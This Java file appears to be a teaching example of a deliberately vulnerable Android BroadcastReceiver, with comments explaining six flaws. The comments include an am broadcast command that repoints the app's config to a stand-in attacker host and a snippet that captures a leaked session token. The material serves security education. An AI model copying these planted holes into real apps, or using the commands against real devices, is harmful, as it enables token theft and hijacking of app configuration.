// examples/ConfigSyncReceiver-vulnerable.java
//
// A BroadcastReceiver that trusts a forgeable action because it sits next to a
// protected one. This is the single most common broadcast bug in shipped
// Android apps, and it is written by careful developers, not careless ones.
//
// THE REASONING THAT PRODUCES IT
//   "BOOT_COMPLETED is a protected broadcast. Only the system can send it.
//    Therefore anything arriving at this receiver came from the system.
//    Therefore I can trust it."
//
//   Each of the first two sentences is true. The third does not follow, because
//   the <intent-filter> lists a SECOND action, and that one is not protected.
//   The receiver is a single door with two keys, and only one of them is
//   controlled.
//
//   Worse, a receiver with android:exported="true" can be addressed EXPLICITLY,
//   by component name, with any action at all -- or with no action at all.
//   Intent filters constrain IMPLICIT delivery only. See
//   ../26-Intent/README.md section 3.2 for why.
//
// PAIRS WITH
//   ConfigSyncReceiver-fixed.java   -- the same feature, written safely
//   AndroidManifest-vulnerable.xml  -- the declaration this class relies on
//   AttackerBroadcaster.java        -- the eight lines that exploit it
//
// BUILD
//   These are library-free plain-Java sources meant to be dropped into an
//   Android module. To build the demo app:
//       cd examples/vulnerable-app && ./build.sh
//   Nothing here compiles standalone with javac -- it needs android.jar on the
//   classpath, which build.sh supplies.
//
// AUTHORISED TESTING ONLY.

package com.example.vault;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class ConfigSyncReceiver extends BroadcastReceiver {

    private static final String TAG = "ConfigSync";

    // The developer's own action. Nothing anywhere makes this name secret: it
    // is a plain string in the manifest, which means it is a plain string in
    // the APK, which means `aapt2 dump xmltree` prints it in one command.
    // "Nobody knows the action name" is not a security control; it is not even
    // an obstacle.
    public static final String ACTION_SYNC = "com.example.vault.ACTION_SYNC_CONFIG";

    public static final String EXTRA_CONFIG_URL = "config_url";
    public static final String EXTRA_FORCE = "force";

    @Override
    public void onReceive(Context context, Intent intent) {

        // ------------------------------------------------------------------
        // BUG 1 -- no action check at all.
        //
        // The filter is assumed to have done the filtering. It did, for
        // implicit Intents. An attacker sending an EXPLICIT Intent
        //
        //     am broadcast -n com.example.vault/.ConfigSyncReceiver \
        //                  --es config_url https://attacker.example/c.json
        //
        // never goes through the filter at all. getAction() here is null, and
        // every branch below that does not test the action still runs.
        // ------------------------------------------------------------------

        Log.i(TAG, "onReceive action=" + intent.getAction());

        SharedPreferences prefs =
                context.getSharedPreferences("vault_config", Context.MODE_PRIVATE);

        // ------------------------------------------------------------------
        // BUG 2 -- an attacker-controlled string becomes the app's config
        //          endpoint, permanently.
        //
        // The value is written to SharedPreferences, so it survives the
        // process, survives a reboot, and is used by every later network call.
        // This is what turns "an exported receiver" into a real finding: a
        // single unauthenticated broadcast produces a persistent, observable
        // change of state. Persistence is what makes it worth reporting.
        // ------------------------------------------------------------------

        String url = intent.getStringExtra(EXTRA_CONFIG_URL);
        if (url != null) {
            prefs.edit().putString("config_url", url).apply();
            Log.i(TAG, "config endpoint is now " + url);
        }

        // ------------------------------------------------------------------
        // BUG 3 -- the "trusted because BOOT_COMPLETED is protected" step.
        //
        // The developer's mental model is that this branch only runs at boot.
        // In fact it runs whenever anything reaches this receiver with the
        // `force` extra set -- which any app can arrange, because ACTION_SYNC
        // is not a protected broadcast and this receiver is exported.
        //
        // syncNow() re-reads config_url, which BUG 2 just let the attacker
        // choose. The two bugs compose: one broadcast repoints the endpoint AND
        // triggers the fetch, in a single unauthenticated message.
        // ------------------------------------------------------------------

        boolean force = intent.getBooleanExtra(EXTRA_FORCE, false);
        if (force || Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            syncNow(context, prefs.getString("config_url", "https://cfg.example.com/v1"));
        }

        // ------------------------------------------------------------------
        // BUG 4 -- leaking a secret through the ordered-broadcast result.
        //
        // setResultData() only means anything when the broadcast was sent with
        // sendOrderedBroadcast(). The developer added it so their OWN app's
        // second receiver could read the session token back. But the RESULT of
        // an ordered broadcast goes to whoever SENT it. An attacker who sends
        //
        //     sendOrderedBroadcast(i, null, new BroadcastReceiver() {
        //         public void onReceive(Context c, Intent x) {
        //             Log.i("attacker", getResultData());  // the token
        //         }
        //     }, null, 0, null, null);
        //
        // receives the token in their own process. No permission involved.
        //
        // Note also that `am broadcast` sends an ORDERED broadcast -- measured
        // on API 30, the historical record reads `ordered=true` -- so even a
        // shell one-liner collects this.
        // ------------------------------------------------------------------

        String token = prefs.getString("session_token", null);
        if (token != null) {
            setResultCode(1);
            setResultData(token);
        }

        // ------------------------------------------------------------------
        // BUG 5 -- announcing the result on an implicit broadcast.
        //
        // No setPackage(), no receiverPermission. Every app on the device that
        // registers a filter for this action receives the completion notice AND
        // the account id inside it. The attacker does not even have to send
        // anything: they just listen.
        // ------------------------------------------------------------------

        Intent done = new Intent("com.example.vault.SYNC_COMPLETE");
        done.putExtra("account_id", prefs.getString("account_id", ""));
        context.sendBroadcast(done);
    }

    // ------------------------------------------------------------------
    // BUG 6 -- doing real work on the main thread inside onReceive.
    //
    // Not a security bug on its own, but it is how the security bug gets
    // noticed: a receiver that blocks is killed. The foreground broadcast
    // queue's timeout was measured at 10 seconds on Android 11 / API 30
    // (`bcast_timeout = +10s0ms`), and the background queue's at 60 seconds.
    // Exceeding it produces an ANR attributed to the receiver, which is a
    // reliable way to find receivers doing things they should not.
    // ------------------------------------------------------------------
    private void syncNow(Context context, String url) {
        Log.i(TAG, "fetching " + url);
        // ... a blocking HTTP request would go here, on the main thread ...
    }
}
